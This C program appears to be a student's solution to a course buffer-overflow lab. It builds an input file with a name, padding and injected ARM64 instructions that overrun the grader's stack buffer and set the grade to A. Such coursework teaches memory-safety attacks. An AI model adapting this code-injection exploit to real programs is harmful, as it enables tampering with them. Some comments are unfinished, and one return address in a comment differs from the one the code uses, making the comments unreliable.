/*
 * Produces dataA file that contains student name, null byte, 
 * and padding to perform stack smashing. 
 */

#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "miniassembler.h"

/*
 * main function writes to "dataA" file to perform stack smashing,
 * causing the grader program to assign the A grade. 
 */
int main() {
    FILE *file = fopen("dataA", "wb");
    if (!file) {
        perror("Unable to open file");
        return 1;
    }

    /* write name to file. 
    grader program will ... */ 
    fwrite("Claire Shin", 1, 11, file);

    /* null byte that signifies the termination of string. 
    grader program will .... */
    fputc('\0', file);

    /* add padding so that buffer overflow can be performed 
    48 - 11 (length of name)= 37. */ 
    for (int i = 0; i < 37; i++) {
        fputc('A', file);
    }

    /* MOV grade A to register W0 using MiniAssembler */
    unsigned int MOV = MiniAssembler_mov(0, 'A');
    fwrite(&MOV, sizeof(unsigned int), 1, file);

    /* STR content of register W0 into the address pointed by X1
    branch back to normal program flow after setting grade to A */
    unsigned int STRB = MiniAssembler_strb(0, 1);
    fwrite(&STRB, sizeof(unsigned int), 1, file);

    /* B back to return address */ 
    /* 0x4008c4 is address where getName is called; 
    0x4008b8 is instruction address right after getName returns */
    unsigned int B = MiniAssembler_b(0x4008c4, 0x40087c); 
    fwrite(&B, sizeof(unsigned int), 1, file);

    fclose(file);
    return 0;

}
